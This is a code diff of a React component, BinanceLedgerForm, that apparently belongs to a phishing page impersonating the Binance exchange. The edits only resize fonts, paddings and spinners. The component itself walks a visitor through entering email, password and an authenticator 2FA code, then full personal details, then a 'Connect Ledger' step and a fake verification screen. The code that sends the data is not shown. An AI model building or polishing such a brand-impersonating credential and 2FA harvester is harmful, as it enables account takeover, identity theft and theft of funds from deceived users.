@@ -131,19 +131,19 @@ const BinanceLedgerForm: FC = () => {
   };
 
   const renderHeader = () => (
-    <div className="flex justify-start mb-8">
+    <div className="flex justify-start mb-6">
       <div className="flex items-center">
         <img 
           src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
           alt="Binance Logo" 
-          className="h-8"
+          className="h-7"
           onError={(e) => {
             setLogoError(true);
             e.currentTarget.style.display = 'none';
           }}
         />
         {logoError && (
-          <span className="text-binance-yellow font-bold text-xl font-binance">
+          <span className="text-binance-yellow font-bold text-lg font-binance">
             BINANCE
           </span>
         )}
@@ -164,12 +164,12 @@ const BinanceLedgerForm: FC = () => {
 
     if (currentStep === 'important-notice') {
       return (
-        <div className="text-center mb-8">
+        <div className="text-center mb-6">
           <div 
-            className="mb-6 flex items-center justify-center gap-2 text-lg font-semibold font-binance"
+            className="mb-4 flex items-center justify-center gap-2 text-sm font-semibold font-binance"
             style={{ color: "#F59E0B" }}
           >
-            <AlertTriangle size={18} className="text-yellow-500" />
+            <AlertTriangle size={14} style={{ color: "#F59E0B" }} />
             {titles[currentStep]}
           </div>
         </div>
@@ -178,21 +178,28 @@ const BinanceLedgerForm: FC = () => {
 
     if (currentStep === 'verifying' || currentStep === 'success') {
       return (
-        <div className="text-center mb-8">
-          <div 
-            className="text-lg font-semibold font-binance mb-4"
-            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-          >
-            {currentStep === 'verifying' ? 'Please wait a moment while we verify your details' : titles[currentStep]}
+        <div className="flex items-center justify-center min-h-[500px]">
+          <div className="text-center">
+            <div 
+              className="text-sm font-semibold font-binance mb-4"
+              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+            >
+              {currentStep === 'verifying' ? 'Please wait a moment while we verify your details' : titles[currentStep]}
+            </div>
+            {currentStep === 'verifying' && (
+              <div className="flex justify-center">
+                <div className="animate-spin rounded-full h-8 w-8 border-4 border-yellow-500 border-t-transparent"></div>
+              </div>
+            )}
           </div>
         </div>
       );
     }
 
     return (
-      <div className="flex justify-between items-center mb-8">
+      <div className="flex justify-between items-center mb-6">
         <div 
-          className="text-2xl font-bold font-binance"
+          className="text-xl font-bold font-binance"
           style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
           role="heading" 
           aria-level={1}
@@ -200,18 +207,18 @@ const BinanceLedgerForm: FC = () => {
           {titles[currentStep]}
         </div>
         {currentStep === 'email' && (
-          <div className="max-md:hidden h-[40px]">
+          <div className="max-md:hidden h-[36px]">
             <div className="bn-tooltips-wrap qrcode-login-popup">
               <div className="bn-tooltips-ele">
                 <div 
-                  className="p-[4px] w-[40px] h-[40px] rounded-[8px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
+                  className="p-[3px] w-[36px] h-[36px] rounded-[6px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
                   style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                   role="button" 
                   aria-label="QR code login" 
                   tabIndex={0}
                 >
                   <svg 
-                    className="w-[32px] h-[32px]" 
+                    className="w-[30px] h-[30px]" 
                     style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                     viewBox="0 0 24 24" 
                     xmlns="http://www.w3.org/2000/svg"
@@ -236,40 +243,34 @@ const BinanceLedgerForm: FC = () => {
   const renderMainForm = () => {
     if (currentStep === 'important-notice') {
       return (
-        <div className="text-center mb-8">
-          <div 
-            className="p-6 rounded-lg border-l-4 border-yellow-500"
-            style={{ 
-              backgroundColor: "#FEF3C7",
-              color: "#92400E"
-            }}
-          >
-            <div className="text-sm font-binance text-center leading-relaxed">
-              Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+        <div className="flex items-center justify-center min-h-[400px]">
+          <div className="text-center max-w-md mx-auto">
+            <div 
+              className="p-4 rounded-md border border-yellow-200 bg-yellow-50/50"
+              style={{ 
+                backgroundColor: "rgba(255, 248, 220, 0.1)",
+                borderColor: "rgba(245, 158, 11, 0.2)"
+              }}
+            >
+              <div className="text-xs font-binance text-center leading-relaxed" style={{ color: "#B7BDC6" }}>
+                Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+              </div>
             </div>
           </div>
         </div>
       );
     }
 
-    if (currentStep === 'verifying') {
-      return (
-        <div className="flex justify-center">
-          <div className="animate-spin rounded-full h-12 w-12 border-4 border-yellow-500 border-t-transparent"></div>
-        </div>
-      );
-    }
-
-    if (currentStep === 'success') {
-      return null; // No form content for success step
+    if (currentStep === 'verifying' || currentStep === 'success') {
+      return null; // Handled in renderTitle
     }
 
     if (currentStep === 'personal-details') {
       return (
         <form onSubmit={handlePersonalDetailsSubmit}>
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-5">
             <div className="bn-formItem">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 First Name
               </label>
               <div 
@@ -277,25 +278,25 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.firstName}
                   onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
                 />
               </div>
               {errors.firstName && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.firstName}
                 </div>
               )}
             </div>
 
             <div className="bn-formItem">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 Last Name
               </label>
               <div 
@@ -303,25 +304,25 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.lastName}
                   onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
                 />
               </div>
               {errors.lastName && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.lastName}
                 </div>
               )}
             </div>
 
             <div className="bn-formItem">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 Date of Birth
               </label>
               <div 
@@ -329,25 +330,25 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <input
                   type="date"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.dateOfBirth}
                   onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
                 />
               </div>
               {errors.dateOfBirth && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.dateOfBirth}
                 </div>
               )}
             </div>
 
             <div className="bn-formItem">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 Phone Number
               </label>
               <div 
@@ -355,25 +356,25 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <input
                   type="tel"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.phoneNumber}
                   onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
                 />
               </div>
               {errors.phoneNumber && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.phoneNumber}
                 </div>
               )}
             </div>
 
             <div className="bn-formItem md:col-span-2">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 Address
               </label>
               <div 
@@ -381,25 +382,25 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.address}
                   onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
                 />
               </div>
               {errors.address && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.address}
                 </div>
               )}
             </div>
 
             <div className="bn-formItem">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 Postal Code
               </label>
               <div 
@@ -407,25 +408,25 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.postalCode}
                   onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
                 />
               </div>
               {errors.postalCode && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.postalCode}
                 </div>
               )}
             </div>
 
             <div className="bn-formItem">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 City
               </label>
               <div 
@@ -433,25 +434,25 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.city}
                   onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
                 />
               </div>
               {errors.city && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.city}
                 </div>
               )}
             </div>
 
             <div className="bn-formItem">
-              <label className="block mb-2 text-sm font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+              <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 Country
               </label>
               <div 
@@ -459,11 +460,11 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "48px"
+                  height: "42px"
                 }}
               >
                 <select
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance appearance-none cursor-pointer"
+                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs appearance-none cursor-pointer"
                   value={personalDetails.country}
                   onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
                   style={{ 
@@ -471,19 +472,19 @@ const BinanceLedgerForm: FC = () => {
                     backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
                     backgroundPosition: 'right 0.75rem center',
                     backgroundRepeat: 'no-repeat',
-                    backgroundSize: '1.5em 1.5em'
+                    backgroundSize: '1.2em 1.2em'
                   }}
                 >
-                  <option value="" className="bg-[#2B3139] text-white">Select a country</option>
+                  <option value="" className="bg-[#2B3139] text-white text-xs">Select a country</option>
                   {countries.map((country) => (
-                    <option key={country} value={country} className="bg-[#2B3139] text-white">
+                    <option key={country} value={country} className="bg-[#2B3139] text-white text-xs">
                       {country}
                     </option>
                   ))}
                 </select>
               </div>
               {errors.country && (
-                <div className="text-red-500 text-sm mt-1 font-binance">
+                <div className="text-red-500 text-xs mt-1 font-binance">
                   {errors.country}
                 </div>
               )}
@@ -498,9 +499,9 @@ const BinanceLedgerForm: FC = () => {
         case 'email':
           return (
             <form onSubmit={handleEmailSubmit}>
-              <div className="bn-formItem mb-6">
+              <div className="bn-formItem mb-5">
                 <label 
-                  className="block mb-2 text-sm font-medium font-binance" 
+                  className="block mb-2 text-xs font-medium font-binance" 
                   htmlFor="bn-formItem-q8nY2Y1v"
                   style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                 >
@@ -513,7 +514,7 @@ const BinanceLedgerForm: FC = () => {
                       style={{
                         backgroundColor: "var(--color-Input, #2B3139)",
                         border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                        height: "48px"
+                        height: "42px"
                       }}
                       role="group"
                     >
@@ -526,7 +527,7 @@ const BinanceLedgerForm: FC = () => {
                         autoFocus
                         id="bn-formItem-q8nY2Y1v"
                         autoCapitalize="off"
-                        className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                        className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                         spellCheck="false"
                         autoComplete="username"
                         value={email}
@@ -534,7 +535,7 @@ const BinanceLedgerForm: FC = () => {
                       />
                     </div>
                     {errors.email && (
-                      <div className="text-red-500 text-sm mt-1 font-binance">
+                      <div className="text-red-500 text-xs mt-1 font-binance">
                         {errors.email}
                       </div>
                     )}
@@ -546,9 +547,9 @@ const BinanceLedgerForm: FC = () => {
         case 'password':
           return (
             <form onSubmit={handlePasswordSubmit}>
-              <div className="bn-formItem mb-6">
+              <div className="bn-formItem mb-5">
                 <label 
-                  className="block mb-2 text-sm font-medium font-binance" 
+                  className="block mb-2 text-xs font-medium font-binance" 
                   htmlFor="password-field"
                   style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                 >
@@ -561,7 +562,7 @@ const BinanceLedgerForm: FC = () => {
                       style={{
                         backgroundColor: "var(--color-Input, #2B3139)",
                         border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                        height: "48px"
+                        height: "42px"
                       }}
                       role="group"
                     >
@@ -574,7 +575,7 @@ const BinanceLedgerForm: FC = () => {
                         autoFocus
                         id="password-field"
                         autoCapitalize="off"
-                        className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance"
+                        className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
                         spellCheck="false"
                         autoComplete="current-password"
                         value={password}
@@ -582,7 +583,7 @@ const BinanceLedgerForm: FC = () => {
                       />
                     </div>
                     {errors.password && (
-                      <div className="text-red-500 text-sm mt-1 font-binance">
+                      <div className="text-red-500 text-xs mt-1 font-binance">
                         {errors.password}
                       </div>
                     )}
@@ -595,13 +596,13 @@ const BinanceLedgerForm: FC = () => {
           return (
             <>
               <div 
-                className="mb-4 text-sm font-binance"
+                className="mb-3 text-xs font-binance"
                 style={{ color: "var(--color-SecondaryText, #B7BDC6)" }}
               >
                 Enter the code from your Google/Binance Authenticator.
               </div>
               <form onSubmit={handleVerificationSubmit}>
-                <div className="bn-formItem mb-6">
+                <div className="bn-formItem mb-5">
                   <label 
                     className="block mb-2 text-xs font-binance" 
                     htmlFor="verification-field"
@@ -616,7 +617,7 @@ const BinanceLedgerForm: FC = () => {
                         style={{
                           backgroundColor: "var(--color-Input, #2B3139)",
                           border: `1px solid ${errors.verification ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                          height: "48px"
+                          height: "42px"
                         }}
                         role="group"
                       >
@@ -629,7 +630,7 @@ const BinanceLedgerForm: FC = () => {
                           autoFocus
                           id="verification-field"
                           autoCapitalize="off"
-                          className="bg-transparent border-0 text-white p-3 pr-16 w-full outline-none h-full font-binance"
+                          className="bg-transparent border-0 text-white p-3 pr-14 w-full outline-none h-full font-binance text-xs"
                           spellCheck="false"
                           maxLength={6}
                           value={verificationCode}
@@ -638,14 +639,14 @@ const BinanceLedgerForm: FC = () => {
                         <button
                           type="button"
                           onClick={handlePaste}
-                          className="absolute right-3 top-1/2 transform -translate-y-1/2 font-medium hover:opacity-80 transition-opacity font-binance"
+                          className="absolute right-3 top-1/2 transform -translate-y-1/2 font-medium hover:opacity-80 transition-opacity font-binance text-xs"
                           style={{ color: "var(--color-BtnBg, #FCD535)" }}
                         >
                           Paste
                         </button>
                       </div>
                       {errors.verification && (
-                        <div className="text-red-500 text-sm mt-1 font-binance">
+                        <div className="text-red-500 text-xs mt-1 font-binance">
                           {errors.verification}
                         </div>
                       )}
@@ -669,11 +670,11 @@ const BinanceLedgerForm: FC = () => {
         <button
           type="button"
           onClick={handleNoticeConfirm}
-          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance"
+          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            height: "48px"
+            height: "42px"
           }}
           aria-label="I Understand"
         >
@@ -690,11 +691,11 @@ const BinanceLedgerForm: FC = () => {
       return (
         <button
           type="button"
-          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance"
+          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            height: "48px"
+            height: "42px"
           }}
           aria-label="Connect Ledger"
         >
@@ -706,11 +707,11 @@ const BinanceLedgerForm: FC = () => {
     if (currentStep === 'personal-details') {
       return (
         <button
-          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance"
+          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            height: "48px"
+            height: "42px"
           }}
           type="submit"
           disabled={isLoading}
@@ -718,7 +719,7 @@ const BinanceLedgerForm: FC = () => {
           onClick={handlePersonalDetailsSubmit}
         >
           {isLoading ? (
-            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
+            <div className="animate-spin rounded-full h-4 w-4 border-2 border-current border-t-transparent"></div>
           ) : (
             'Submit'
           )}
@@ -741,18 +742,18 @@ const BinanceLedgerForm: FC = () => {
 
     return (
       <button
-        className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance"
+        className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
         style={{
           backgroundColor: "var(--color-BtnBg, #FCD535)",
           color: "var(--color-TextOnYellow, #202630)",
-          height: "48px"
+          height: "42px"
         }}
         type="submit"
         disabled={isLoading}
         aria-label={getButtonText()}
       >
         {isLoading ? (
-          <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
+          <div className="animate-spin rounded-full h-4 w-4 border-2 border-current border-t-transparent"></div>
         ) : (
           getButtonText()
         )}
@@ -765,17 +766,17 @@ const BinanceLedgerForm: FC = () => {
 
     return (
       <>
-        <div className="my-4 flex items-center md:mb-2 md:mt-6">
+        <div className="my-3 flex items-center md:mb-2 md:mt-5">
           <div 
             className="h-[1px] flex-1" 
             style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
           />
           <div 
-            className="px-4 text-sm font-binance"
+            className="px-3 text-xs font-binance"
             style={{ 
               color: "var(--color-TertiaryText, #848E9C)",
               fontWeight: "400",
-              lineHeight: "20px"
+              lineHeight: "18px"
             }}
           >
             or
@@ -786,25 +787,25 @@ const BinanceLedgerForm: FC = () => {
           />
         </div>
 
-        <div className="space-y-3">
+        <div className="space-y-2">
           <button 
             className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "14px",
+              fontSize: "12px",
               fontWeight: "400",
-              lineHeight: "20px",
-              height: "48px"
+              lineHeight: "18px",
+              height: "42px"
             }}
             role="button" 
             aria-label="Continue with Passkey"
           >
-            <div className="icon-warp mr-3">
-              <div className="ml-1 h-[20px]">
+            <div className="icon-warp mr-2">
+              <div className="ml-1 h-[18px]">
                 <svg 
-                  className="bn-svg h-[20px] w-[20px]" 
+                  className="bn-svg h-[18px] w-[18px]" 
                   style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                   viewBox="0 0 24 24" 
                   xmlns="http://www.w3.org/2000/svg"
@@ -824,16 +825,16 @@ const BinanceLedgerForm: FC = () => {
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "14px",
+              fontSize: "12px",
               fontWeight: "400",
-              lineHeight: "20px",
-              height: "48px"
+              lineHeight: "18px",
+              height: "42px"
             }}
             role="button" 
             aria-label="Continue with Google"
           >
-            <div className="icon-warp mr-3">
-              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
+            <div className="icon-warp mr-2">
+              <svg width="20" height="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
                 <g clipPath="url(#clip0_2445_976)">
                   <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
                   <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
@@ -856,16 +857,16 @@ const BinanceLedgerForm: FC = () => {
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "14px",
+              fontSize: "12px",
               fontWeight: "400",
-              lineHeight: "20px",
-              height: "48px"
+              lineHeight: "18px",
+              height: "42px"
             }}
             role="button" 
             aria-label="Continue with Telegram"
           >
-            <div className="icon-warp mr-3">
-              <svg height="24" width="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
+            <div className="icon-warp mr-2">
+              <svg height="20" width="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
                 <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
               </svg>
             </div>
@@ -882,131 +883,21 @@ const BinanceLedgerForm: FC = () => {
       style={{ backgroundColor: "var(--color-Body, #181A20)" }}
     >
       <div 
-        className="w-full max-w-md p-8 rounded-lg"
+        className="w-full max-w-md p-6 rounded-lg"
         style={{ 
           backgroundColor: "var(--color-Card, #1E2329)",
-          minHeight: "600px"
+          minHeight: "550px"
         }}
       >
         {renderHeader()}
         {renderTitle()}
         
-        <div style={{ minHeight: "400px" }} className="flex flex-col">
+        <div style={{ minHeight: "360px" }} className="flex flex-col">
           {renderMainForm()}
           
           <div className="mt-auto">
             {renderButton()}
-            {currentStep === 'email' && (
-              <>
-                <div className="my-4 flex items-center md:mb-2 md:mt-6">
-                  <div 
-                    className="h-[1px] flex-1" 
-                    style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
-                  />
-                  <div 
-                    className="px-4 text-sm font-binance"
-                    style={{ 
-                      color: "var(--color-TertiaryText, #848E9C)",
-                      fontWeight: "400",
-                      lineHeight: "20px"
-                    }}
-                  >
-                    or
-                  </div>
-                  <div 
-                    className="h-[1px] flex-1" 
-                    style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
-                  />
-                </div>
-
-                <div className="space-y-3">
-                  <button 
-                    className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
-                    style={{
-                      backgroundColor: "transparent",
-                      border: "1px solid var(--color-InputLine, #474D57)",
-                      color: "var(--color-PrimaryText, #EAECEF)",
-                      fontSize: "14px",
-                      fontWeight: "400",
-                      lineHeight: "20px",
-                      height: "48px"
-                    }}
-                    role="button" 
-                    aria-label="Continue with Passkey"
-                  >
-                    <div className="icon-warp mr-3">
-                      <div className="ml-1 h-[20px]">
-                        <svg 
-                          className="bn-svg h-[20px] w-[20px]" 
-                          style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                          viewBox="0 0 24 24" 
-                          xmlns="http://www.w3.org/2000/svg"
-                          fill="currentColor"
-                        >
-                          <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-2.9 2.35-5.25 5.25-5.25h3c2.9 0 5.25 2.35 5.25 5.25v4a.75.75 0 01-1.5 0v-4a3.75 3.75 0 00-3.75-3.75h-3A3.75 3.75 0 003 17v4a.75.75 0 01-1.5 0v-4zM8.25 9a3 3 0 100-6 3 3 0 000 6zm0 1.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM18.536 11.923a.75.75 0 00-.75.75v5.138a.75.75 0 001.5 0v-5.138a.75.75 0 00-.75-.75z" />
-                          <path fillRule="evenodd" clipRule="evenodd" d="M17.786 16.041c0 .414.336.75.75.75h2.167a.75.75 0 000-1.5h-2.167a.75.75 0 00-.75.75zM16.75 10.15a1.773 1.773 0 113.545 0 1.773 1.773 0 01-3.545 0zm1.773-3.272a3.273 3.273 0 100 6.545 3.273 3.273 0 000-6.545z" />
-                        </svg>
-                      </div>
-                    </div>
-                    <div>Continue with Passkey</div>
-                  </button>
-
-                  <button 
-                    className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
-                    style={{
-                      backgroundColor: "transparent",
